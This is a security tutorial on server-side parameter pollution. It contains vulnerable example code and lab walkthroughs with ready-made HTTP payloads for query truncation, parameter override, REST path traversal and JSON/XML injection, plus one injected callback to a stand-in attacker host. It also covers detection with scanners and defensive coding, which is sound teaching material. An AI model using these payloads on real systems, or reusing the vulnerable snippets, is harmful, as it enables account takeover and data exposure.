# Server-Side Parameter Pollution

Server-side parameter pollution is a web security vulnerability that occurs when an application embeds user-controlled input into server-side requests to internal APIs without proper encoding or validation. Unlike client-side parameter pollution which affects the user's browser, server-side parameter pollution manipulates the parameters sent between the front-end application and back-end internal APIs that are not directly accessible from the internet. Attackers exploit this vulnerability by injecting special characters like ampersands (&), hash symbols (#), equals signs (=), and path traversal sequences to manipulate query strings, REST URL paths, or structured data formats (JSON, XML), enabling them to override existing parameters, inject additional parameters, truncate queries, modify application behavior, escalate privileges, and access unauthorized data belonging to other users or restricted functionality.

The core issue: **applications trust user input when constructing server-side API requests**—inadequate encoding allows parameter injection between internal systems.

## What is server-side parameter pollution?

### Architecture and attack surface

**Typical vulnerable architecture:**

```
User Browser
    ↓ (User input: name=peter#admin)
Front-end Application (Public)
    ↓ (Constructs request with user input)
Internal API (Not directly accessible)
    ↓ (Processes manipulated request)
Database / Backend Systems
```

**Normal flow:**
```http
User request to front-end:
GET /userSearch?name=peter HTTP/1.1

Front-end constructs request to internal API:
GET /internal/api/users/search?name=peter&publicProfile=true HTTP/1.1

Internal API response:
{
    "username": "peter",
    "email": "peter@example.com",
    "isPublic": true
}
```

**Vulnerable flow:**
```http
User request with injection:
GET /userSearch?name=peter%23&publicProfile=false HTTP/1.1

Front-end (vulnerable) constructs request:
GET /internal/api/users/search?name=peter#&publicProfile=false&publicProfile=true HTTP/1.1

Internal API interprets:
GET /internal/api/users/search?name=peter
(Everything after # is treated as fragment, ignored)

Result: publicProfile=true constraint removed, exposing private profiles!
```

### Vulnerable code example

**Node.js/Express vulnerable implementation:**
```javascript
app.get('/userSearch', function(req, res) {
    const username = req.query.name;
    const returnUrl = req.query.back;
    
    // Vulnerable: User input directly embedded without encoding
    const apiUrl = `http://internal-api:8080/users/search?name=${username}&publicProfile=true`;
    
    axios.get(apiUrl)
        .then(response => {
            res.json(response.data);
        })
        .catch(error => {
            res.status(500).send('Error');
        });
});
```

**Attack:**
```http
GET /userSearch?name=peter%26publicProfile=false HTTP/1.1

Results in internal API call:
GET http://internal-api:8080/users/search?name=peter&publicProfile=false&publicProfile=true
```

**PHP vulnerable implementation:**
```php
<?php
$username = $_GET['name'];

// Vulnerable: Direct concatenation
$api_url = "http://internal-api/users?name=" . $username . "&role=user";

$response = file_get_contents($api_url);
echo $response;
?>
```

**Attack:**
```
GET /search?name=admin%26role=administrator HTTP/1.1

Results in:
http://internal-api/users?name=admin&role=administrator&role=user
```

### Impact of server-side parameter pollution

**Critical impacts:**

**Privilege escalation:**
```http
Normal: GET /api/user/profile?id=123&role=user
Injected: GET /api/user/profile?id=123%26role=admin&role=user
Result: GET /api/user/profile?id=123&role=admin&role=user
→ May grant admin privileges if role=admin parsed first
```

**Access control bypass:**
```http
Normal: GET /api/documents?userId=123&access=public
Injected: GET /api/documents?userId=123%26access=private&access=public
Result: Exposes private documents
```

**Data exfiltration:**
```http
Normal: GET /api/users?id=123
Injected: GET /api/users?id=123%26includePassword=true
Result: Exposes password hashes
```

**Authentication bypass:**
```http
Normal: GET /api/verify?token=abc123&authenticated=false
Injected: GET /api/verify?token=invalid%26authenticated=true&authenticated=false
Result: Bypass token verification
```

## Testing in query strings

### Technique 1: Query string truncation

**Goal:** Use URL fragment (#) to truncate server-side request.

**Vulnerable application:**

**Front-end endpoint:**
```http
GET /userSearch?name=peter&back=/home HTTP/1.1
```

**Server-side request constructed:**
```http
GET /users/search?name=peter&publicProfile=true HTTP/1.1
```

**Attack payload:**
```http
GET /userSearch?name=peter%23foo&back=/home HTTP/1.1
```

**URL encoding:**
```
%23 = # (hash/fragment identifier)
```

**Server-side request becomes:**
```http
GET /users/search?name=peter#foo&publicProfile=true HTTP/1.1
```

**Interpretation:**
```
Server receives: name=peter#foo&publicProfile=true
URL parsing: name=peter
Fragment: #foo&publicProfile=true
Effective query: name=peter only
Result: publicProfile=true constraint removed!
```

**Testing methodology:**

**Step 1: Baseline request**
```http
GET /userSearch?name=peter&back=/home HTTP/1.1

Response:
{
    "username": "peter",
    "email": "peter@example.com",
    "profile": "public"
}
```

**Step 2: Test truncation with # character**
```http
GET /userSearch?name=peter%23&back=/home HTTP/1.1

Response:
{
    "username": "peter",
    "email": "peter@example.com",
    "profile": "private",
    "ssn": "123-45-6789"
}
```

**Different response → Truncation successful!**

**Step 3: Verify with test string**
```http
GET /userSearch?name=peter%23teststring&back=/home HTTP/1.1
```

**If successful:**
- Response shows user "peter" (teststring ignored)
- Additional fields appear (private data exposed)

**If unsuccessful:**
- Error: "User peter#teststring not found"
- Or: No change in response

**Step 4: Exploit to access private profiles**
```http
GET /userSearch?name=administrator%23&back=/home HTTP/1.1

Response includes administrator's private data!
```

### Technique 2: Injecting invalid parameters

**Goal:** Add arbitrary parameter to test if injection works.

**Attack payload:**
```http
GET /userSearch?name=peter%26foo=xyz&back=/home HTTP/1.1
```

**URL encoding:**
```
%26 = & (parameter separator)
```

**Server-side request:**
```http
GET /users/search?name=peter&foo=xyz&publicProfile=true HTTP/1.1
```

**Response analysis:**

**Scenario A: Unchanged response**
```
Response identical to normal request
→ Parameter injected but ignored
→ Confirms injection possible, continue testing
```

**Scenario B: Error message**
```
Response: {"error": "Invalid parameter: foo"}
→ Parameter processed but rejected
→ Confirms injection works, API validates parameters
```

**Scenario C: Different response**
```
Response structure changes
→ Parameter affected processing
→ Test with valid parameters
```

### Technique 3: Injecting valid parameters

**Goal:** Inject parameters that internal API recognizes.

**Parameter discovery techniques:**

**Technique A: Review API responses**
```http
GET /userSearch?name=peter HTTP/1.1

Response:
{
    "username": "peter",
    "email": "peter@example.com",
    "role": "user",
    "verified": true,
    "accountBalance": 100
}
```

**Discovered parameters:**
- email
- role
- verified
- accountBalance

**Technique B: Fuzz common parameter names**
```
Common parameters to test:
admin
role
isAdmin
privileged
debug
access
level
type
status
verified
approved
```

**Injection test:**

**Test email parameter:**
```http
GET /userSearch?name=peter%26email=attacker@evil.com&back=/home HTTP/1.1

Server-side:
GET /users/search?name=peter&email=attacker@evil.com&publicProfile=true
```

**Observe response changes:**
```
Response now shows attacker@evil.com instead of peter's email
→ Email parameter successfully injected and processed
```

**Test role parameter:**
```http
GET /userSearch?name=peter%26role=admin&back=/home HTTP/1.1

Server-side:
GET /users/search?name=peter&role=admin&publicProfile=true
```

**Response shows admin-level data:**
```json
{
    "username": "peter",
    "role": "admin",
    "adminPanelUrl": "/admin",
    "allUsers": [...]
}
```

### Technique 4: Parameter override

**Goal:** Override existing parameters by injecting duplicate parameter names.

**Payload:**
```http
GET /userSearch?name=peter%26name=carlos&back=/home HTTP/1.1
```

**Server-side request:**
```http
GET /users/search?name=peter&name=carlos&publicProfile=true HTTP/1.1
```

**Platform-specific behavior:**

**PHP (uses last parameter):**
```php
// PHP: $_GET['name'] = 'carlos'
GET /users/search?name=peter&name=carlos

Result: Search for "carlos"
```

**ASP.NET (combines parameters):**
```csharp
// ASP.NET: Request.QueryString["name"] = "peter,carlos"
GET /users/search?name=peter&name=carlos

Result: Search for "peter,carlos" (likely error)
```

**Node.js/Express (uses first parameter):**
```javascript
// Node.js: req.query.name = 'peter'
GET /users/search?name=peter&name=carlos

Result: Search for "peter" (no change)
```

**Java/Tomcat (returns array):**
```java
// Java: request.getParameterValues("name") = ["peter", "carlos"]
GET /users/search?name=peter&name=carlos

Result: Depends on implementation
```

**Exploitation strategies:**

**Strategy 1: Override to access other users**
```http
GET /userSearch?name=wiener%26name=administrator&back=/home HTTP/1.1

If PHP backend:
→ Returns administrator profile
```

**Strategy 2: Override security parameters**
```http
GET /api/users?id=123%26admin=true&admin=false

If last parameter wins:
→ admin=false overridden with admin=true
```

**Strategy 3: Override authentication**
```http
GET /verify?token=invalid%26authenticated=true&authenticated=false

If last parameter wins:
→ authenticated=false overridden with authenticated=true
```

#### Lab: Exploiting server-side parameter pollution in a query string

**Scenario:** Password reset function vulnerable to server-side parameter pollution.

**Step 1: Normal password reset flow**
```http
POST /forgot-password HTTP/1.1

username=wiener

Response: Password reset email sent
```

**Step 2: Analyze behavior**
```
Front-end likely calls internal API:
POST /internal/api/reset?username=wiener&type=email
```

**Step 3: Test truncation**
```http
POST /forgot-password HTTP/1.1

username=wiener%23

Response: Different error or behavior
```

**Step 4: Test parameter injection**
```http
POST /forgot-password HTTP/1.1

username=administrator%26field=value

Response: Observe changes
```

**Step 5: Discover internal parameters**

Test common parameter names:
```
username=administrator%26email=attacker@exploit.com
username=administrator%26reset_token=attacker_token
username=administrator%26callback_url=https://attacker.com
```

**Step 6: Identify parameter that exposes reset token**
```http
POST /forgot-password HTTP/1.1

username=administrator%26field=reset_token

Response:
{
    "message": "Reset initiated",
    "reset_token": "abc123xyz789..."
}
```

**Step 7: Use exposed token**
```http
POST /reset-password HTTP/1.1

token=abc123xyz789...&password=newpassword123

Response: Password reset successful
```

**Step 8: Login as administrator**
```
Username: administrator
Password: newpassword123
Lab solved!
```

## Testing in REST URL paths

### Understanding REST path parameters

**REST API structure:**
```
GET /api/users/123

Breakdown:
/api         - Base path
/users       - Resource
/123         - Resource identifier (parameter)
```

**Common patterns:**
```
GET /api/users/123                      - Get user 123
GET /api/users/123/profile              - Get user 123's profile
GET /api/users/123/orders/456           - Get order 456 for user 123
GET /api/products/electronics/laptops   - Category-based routing
```

### Path traversal in REST APIs

**Vulnerable application:**

**Front-end endpoint:**
```http
GET /edit_profile.php?name=peter HTTP/1.1
```

**Server-side constructs REST path:**
```http
GET /api/private/users/peter HTTP/1.1
```

**Attack: Path traversal injection**
```http
GET /edit_profile.php?name=peter%2f..%2fadmin HTTP/1.1
```

**URL encoding:**
```
%2f = / (forward slash)
%2e = . (period)
```

**Server-side request:**
```http
GET /api/private/users/peter/../admin HTTP/1.1
```

**Path normalization:**
```
Original: /api/private/users/peter/../admin
Normalized: /api/private/users/admin

Result: Access admin profile instead of peter's!
```

### Testing methodology for REST path pollution

**Step 1: Identify REST path structure**

**Capture request:**
```http
GET /edit_profile.php?name=carlos HTTP/1.1

Response: Carlos's profile data
```

**Infer internal API structure:**
```
Likely: GET /api/private/users/carlos
```

**Step 2: Test basic path traversal**
```http
GET /edit_profile.php?name=carlos%2f.. HTTP/1.1

Server-side:
GET /api/private/users/carlos/..
→ Resolves to /api/private/users/

Response: Error or list of users?
```

**Step 3: Test directory traversal**
```http
GET /edit_profile.php?name=carlos%2f..%2f.. HTTP/1.1

Server-side:
GET /api/private/users/carlos/../..
→ Resolves to /api/private/

Response: May expose private API root
```

**Step 4: Access other users**
```http
GET /edit_profile.php?name=carlos%2f..%2fadministrator HTTP/1.1

Server-side:
GET /api/private/users/carlos/../administrator
→ Resolves to /api/private/users/administrator

Response: Administrator profile!
```

**Step 5: Access admin endpoints**
```http
GET /edit_profile.php?name=carlos%2f..%2fadmin%2fconfig HTTP/1.1

Server-side:
GET /api/private/users/carlos/../admin/config
→ Resolves to /api/private/admin/config

Response: Admin configuration data
```

### Path traversal encoding variations

**Different encoding methods:**

**URL encoding:**
```
/ = %2f
. = %2e

carlos/../admin = carlos%2f..%2fadmin
```

**Double URL encoding:**
```
% = %25

%2f = %252f (% encoded as %25)

carlos/../admin = carlos%252f..%252fadmin
```

**16-bit Unicode encoding:**
```
/ = %u2215
\ = %u2216

carlos/../admin = carlos%u2215..%u2215admin
```

**Testing payload variations:**
```
carlos/../admin
carlos%2f..%2fadmin
carlos%2f%2e%2e%2fadmin
carlos%252f..%252fadmin
carlos/..%252fadmin
carlos\\..\\.\\admin (Windows)
```

#### Lab: Exploiting server-side parameter pollution in a REST URL

**Scenario:** Profile editing vulnerable to REST path pollution.

**Step 1: Normal profile access**
```http
GET /edit_profile.php?name=wiener HTTP/1.1

Response: Wiener's profile editing form
```

**Step 2: Test path traversal**
```http
GET /edit_profile.php?name=wiener%2f.. HTTP/1.1

Response: Different (error or unexpected content)
```

**Step 3: Attempt to access administrator**
```http
GET /edit_profile.php?name=wiener%2f..%2fadministrator HTTP/1.1

Response: 
HTTP/1.1 401 Unauthorized
{"error": "Insufficient privileges"}
```

**Step 4: Discover API structure through error messages**

Try variations:
```http
GET /edit_profile.php?name=..%2fadministrator HTTP/1.1

Response shows internal API path in error:
{"error": "Cannot access /api/private/users/../administrator"}
```

**Step 5: Find accessible admin endpoints**
```http
GET /edit_profile.php?name=..%2fadmin%2fdelete HTTP/1.1

Response:
{
    "method": "POST",
    "parameters": {
        "username": "required",
        "csrf": "required"
    }
}
```

**Step 6: Exploit discovered endpoint**
```http
POST /edit_profile.php?name=..%2fadmin%2fdelete HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=carlos&csrf=<token>

Response: User carlos deleted
Lab solved!
```

## Testing in structured data formats

### JSON parameter pollution

**Vulnerable scenario:**

**Front-end request:**
```http
POST /myaccount HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name=peter
```

**Server-side constructs JSON for internal API:**
```http
PATCH /users/7312/update HTTP/1.1
Content-Type: application/json

{"name":"peter"}
```

**Attack: JSON injection**

**Payload:**
```http
POST /myaccount HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name=peter","access_level":"administrator
```

**Server-side constructs:**
```http
PATCH /users/7312/update HTTP/1.1

{"name":"peter","access_level":"administrator"}
```

**Result:** Privilege escalation to administrator!

### JSON injection techniques

**Technique 1: Close and inject new property**

**Original:**
```json
{"name":"peter"}
```

**Injection payload:**
```
peter","isAdmin":true,"foo":"bar
```

**Result:**
```json
{"name":"peter","isAdmin":true,"foo":"bar"}
```

**Technique 2: Array injection**

**Original:**
```json
{"username":"peter"}
```

**Injection payload:**
```
peter","roles":["admin","superuser"],"x":"y
```

**Result:**
```json
{"username":"peter","roles":["admin","superuser"],"x":"y"}
```

**Technique 3: Nested object injection**

**Original:**
```json
{"profile":{"name":"peter"}}
```

**Injection payload:**
```
peter"},"isAdmin":true,"dummy":"value
```

**Result:**
```json
{"profile":{"name":"peter"},"isAdmin":true,"dummy":"value"}
```

### JSON-in-JSON injection

**Scenario:** Client sends JSON, server embeds in another JSON.

**Client request:**
```http
POST /myaccount HTTP/1.1
Content-Type: application/json

{"name":"peter"}
```

**Server-side constructs:**
```http
PATCH /users/7312/update HTTP/1.1

{"name":"peter"}
```

**Attack: Escaped JSON injection**

**Payload:**
```http
POST /myaccount HTTP/1.1
Content-Type: application/json

{"name":"peter\",\"access_level\":\"administrator"}
```

**Breakdown:**
```
Input: peter\",\"access_level\":\"administrator
Server processes: Decodes escaped quotes
Result: peter","access_level":"administrator
```

**Server-side becomes:**
```json
{"name":"peter","access_level":"administrator"}
```

**Testing methodology:**

**Step 1: Baseline**
```http
POST /api/profile HTTP/1.1

{"name":"test"}

Response: Profile updated
```

**Step 2: Test JSON syntax injection**
```http
POST /api/profile HTTP/1.1

{"name":"test\",\"injected\":\"value"}

Response: Check if injected parameter appears
```

**Step 3: Inject privilege escalation**
```http
POST /api/profile HTTP/1.1

{"name":"test\",\"role\":\"admin"}

Response: Check profile for elevated role
```

### XML parameter pollution

**Vulnerable scenario:**

**Client request:**
```http
POST /updateProfile HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=peter
```

**Server-side constructs XML:**
```xml
<update>
    <username>peter</username>
    <role>user</role>
</update>
```

**Attack: XML injection**

**Payload:**
```
username=peter</username><role>admin</role><dummy>foo
```

**Server-side constructs:**
```xml
<update>
    <username>peter</username><role>admin</role><dummy>foo</username>
    <role>user</role>
</update>
```

**XML parser reads:**
```xml
<update>
    <username>peter</username>
    <role>admin</role>  ← Injected (parsed first)
    <dummy>foo</username>
    <role>user</role>  ← Original (may be ignored)
</update>
```

**Result:** Role elevated to admin!

### Response-based structured format injection

**Scenario:** User input stored safely, but embedded unsafely in API responses.

**Database stores:**
```sql
INSERT INTO users (username) VALUES ('peter","isAdmin":true,"x":"y');
```

**Stored as string:** `peter","isAdmin":true,"x":"y`

**API response construction (vulnerable):**
```javascript
app.get('/api/user/:id', function(req, res) {
    const user = db.getUser(req.params.id);
    
    // Vulnerable: Direct string concatenation
    const response = '{"username":"' + user.username + '","role":"user"}';
    
    res.send(response);
});
```

**Response sent:**
```json
{"username":"peter","isAdmin":true,"x":"y","role":"user"}
```

**Client-side JavaScript processes:**
```javascript
const data = JSON.parse(response);
console.log(data.isAdmin); // true
```

**Result:** Client treats user as admin!

## Automated detection tools

### Burp Scanner suspicious input transformation

**What Burp Scanner detects:**

```
Burp identifies when:
1. User input is received
2. Input undergoes transformation
3. Transformed input appears in server-side behavior

Example:
Input: test#foo
Transformation: Truncated to "test"
Detection: Different response than "test#foo" would normally produce
```

**How to review findings:**

```
1. Dashboard → Issue activity
2. Filter: "Suspicious input transformation"
3. Review details:
   - Original input
   - Detected transformation
   - Evidence in responses
4. Manually verify with techniques above
```

**Example finding:**
```
Issue: Suspicious input transformation
Severity: Information
Input: name=peter%23test
Observation: Application behaved as if input was "peter"
Recommendation: Investigate for server-side parameter pollution
```

### Backslash Powered Scanner

**BApp functionality:**

```
Tests inputs with backslash-based payloads:
- Backslash sequences
- Escape characters
- Special syntax characters
- Combines with other characters
```

**Classifications:**

**Boring:**
```
Input: test\x00
Response: Identical to normal input
Classification: Not vulnerable
```

**Interesting:**
```
Input: test\n
Response: Different than normal
Classification: Requires manual investigation
```

**Vulnerable:**
```
Input: test\u0022admin\u0022
Response: Clear evidence of injection
Classification: Confirmed vulnerability
```

**Using Backslash Powered Scanner:**
```
1. Install from BApp Store
2. Configure scope
3. Run passive scan
4. Review "Interesting" and "Vulnerable" findings
5. Manually test identified inputs
```

### Manual testing workflow with Burp

**Complete testing process:**

**Step 1: Identify injection points**
```
Burp Proxy → HTTP history
Review all user inputs:
- Query parameters
- POST body parameters
- JSON properties
- Headers
- Path parameters
```

**Step 2: Test truncation**
```
Send to Repeater
Add %23 (URL-encoded #)
Compare responses
```

**Step 3: Test parameter injection**
```
Add %26param=value
Observe response changes
```

**Step 4: Discover valid parameters**
```
Review API responses for field names
Fuzz common parameter names
Use Param Miner
```

**Step 5: Test parameter override**
```
Inject duplicate parameters
Test platform-specific behavior
```

**Step 6: Test structured formats**
```
JSON: Inject ","param":"value
XML: Inject </tag><param>value</param>
```

**Step 7: Automate with Intruder**
```
Set payload positions
Use parameter name wordlists
Compare response lengths/content
Identify successful injections
```

## Prevention strategies

### Defense Layer 1: Input encoding

**Proper URL encoding:**

**Node.js:**
```javascript
const encodeQueryParam = require('querystring').escape;

app.get('/userSearch', function(req, res) {
    const username = req.query.name;
    
    // Encode user input before embedding in URL
    const encodedUsername = encodeURIComponent(username);
    
    const apiUrl = `http://internal-api/users?name=${encodedUsername}&publicProfile=true`;
    
    axios.get(apiUrl)
        .then(response => res.json(response.data))
        .catch(error => res.status(500).send('Error'));
});
```

**PHP:**
```php
<?php
$username = $_GET['name'];

// Encode before embedding in URL
$encoded = urlencode($username);
$api_url = "http://internal-api/users?name=" . $encoded . "&role=user";

$response = file_get_contents($api_url);
echo $response;
?>
```

**Python:**
```python
from urllib.parse import urlencode, quote

def search_user(username):
    # Encode parameter
    encoded_username = quote(username, safe='')
    
    api_url = f"http://internal-api/users?name={encoded_username}&publicProfile=true"
    
    response = requests.get(api_url)
    return response.json()
```

### Defense Layer 2: Use parameterized requests

**Avoid string concatenation:**

**Bad (vulnerable):**
```javascript
const apiUrl = `http://api/users?name=${username}&role=user`;
axios.get(apiUrl);
```

**Good (parameterized):**
```javascript
axios.get('http://api/users', {
    params: {
        name: username,
        role: 'user'
    }
});
```

**Python with requests library:**
```python
# Good: Parameters dictionary
params = {
    'name': username,
    'role': 'user'
}
response = requests.get('http://api/users', params=params)
```

**Node.js with URL API:**
```javascript
const url = new URL('http://api/users');
url.searchParams.append('name', username);
url.searchParams.append('role', 'user');

axios.get(url.toString());
```

### Defense Layer 3: Input validation allowlist

**Allowlist safe characters:**

```javascript
function sanitizeUsername(input) {
    // Allowlist: alphanumeric and underscore only
    const allowedPattern = /^[a-zA-Z0-9_]+$/;
    
    if (!allowedPattern.test(input)) {
        throw new Error('Invalid username format');
    }
    
    return input;
}

app.get('/userSearch', function(req, res) {
    try {
        const username = sanitizeUsername(req.query.name);
        
        // Safe to use in API call
        const apiUrl = `http://api/users?name=${username}&role=user`;
        // ...
    } catch (err) {
        res.status(400).json({ error: 'Invalid input' });
    }
});
```

**Context-specific validation:**
```javascript
const validators = {
    username: /^[a-zA-Z0-9_]{3,20}$/,
    email: /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/,
    numeric: /^[0-9]+$/,
    alphanumeric: /^[a-zA-Z0-9]+$/
};

function validate(input, type) {
    if (!validators[type].test(input)) {
        throw new Error(`Invalid ${type} format`);
    }
    return input;
}
```

### Defense Layer 4: Structured format encoding

**JSON encoding:**

**Bad (vulnerable):**
```javascript
const jsonData = `{"name":"${username}","role":"user"}`;
```

**Good (proper JSON):**
```javascript
const jsonData = JSON.stringify({
    name: username,
    role: 'user'
});
```

**XML encoding:**

**Bad (vulnerable):**
```javascript
const xmlData = `<user><name>${username}</name><role>user</role></user>`;
```

**Good (proper XML encoding):**
```javascript
const escapeXml = (str) => {
    return str.replace(/[<>&'"]/g, (char) => {
        switch (char) {
            case '<': return '&lt;';
            case '>': return '&gt;';
            case '&': return '&amp;';
            case "'": return '&apos;';
            case '"': return '&quot;';
        }
    });
};

const xmlData = `<user><name>${escapeXml(username)}</name><role>user</role></user>`;
```

### Defense Layer 5: Schema validation

**JSON Schema validation:**

```javascript
const Ajv = require('ajv');
const ajv = new Ajv();

const internalApiSchema = {
    type: 'object',
    properties: {
        name: { type: 'string', pattern: '^[a-zA-Z0-9_]+$' },
        role: { type: 'string', enum: ['user', 'admin'] }
    },
    required: ['name', 'role'],
    additionalProperties: false  // Reject unexpected properties
};

const validate = ajv.compile(internalApiSchema);

app.get('/userSearch', function(req, res) {
    const requestData = {
        name: req.query.name,
        role: 'user'
    };
    
    // Validate before sending to internal API
    if (!validate(requestData)) {
        return res.status(400).json({ 
            error: 'Invalid request data',
            details: validate.errors
        });
    }
    
    // Safe to send
    axios.post('http://api/users/search', requestData)
        .then(response => res.json(response.data));
});
```

### Defense Layer 6: Path normalization and validation

**Prevent path traversal:**

```javascript
const path = require('path');

app.get('/user/profile', function(req, res) {
    const username = req.query.name;
    
    // Validate username (no path characters)
    if (/[\/\\.]/.test(username)) {
        return res.status(400).json({ error: 'Invalid username' });
    }
    
    // Construct path safely
    const apiPath = `/api/private/users/${username}`;
    
    // Normalize and validate
    const normalizedPath = path.normalize(apiPath);
    
    // Ensure path starts with expected base
    if (!normalizedPath.startsWith('/api/private/users/')) {
        return res.status(400).json({ error: 'Invalid path' });
    }
    
    // Safe to call
    axios.get(`http://internal-api${normalizedPath}`)
        .then(response => res.json(response.data));
});
```

### Complete secure implementation

```javascript
const express = require('express');
const axios = require('axios');
const Ajv = require('ajv');
const ajv = new Ajv();

const app = express();

// Input validation schema
const userSearchSchema = {
    type: 'object',
    properties: {
        name: { 
            type: 'string', 
            pattern: '^[a-zA-Z0-9_]{3,20}$',
            minLength: 3,
            maxLength: 20
        }
    },
    required: ['name'],
    additionalProperties: false
};

const validateUserSearch = ajv.compile(userSearchSchema);

// Secure endpoint
app.get('/userSearch', async function(req, res) {
    try {
        // Validate input
        const inputData = { name: req.query.name };
        
        if (!validateUserSearch(inputData)) {
            return res.status(400).json({ 
                error: 'Invalid input',
                details: validateUserSearch.errors
            });
        }
        
        // Use parameterized request (no concatenation)
        const response = await axios.get('http://internal-api:8080/users/search', {
            params: {
                name: inputData.name,
                publicProfile: true
            },
            timeout: 5000
        });
        
        // Filter response (don't expose all fields)
        const safeData = {
            username: response.data.username,
            publicInfo: response.data.publicInfo
            // Don't expose: email, internal fields, etc.
        };
        
        res.json(safeData);
        
    } catch (error) {
        // Generic error (don't expose internal details)
        console.error('Internal API error:', error);
        res.status(500).json({ error: 'Search failed' });
    }
});

app.listen(3000);
```
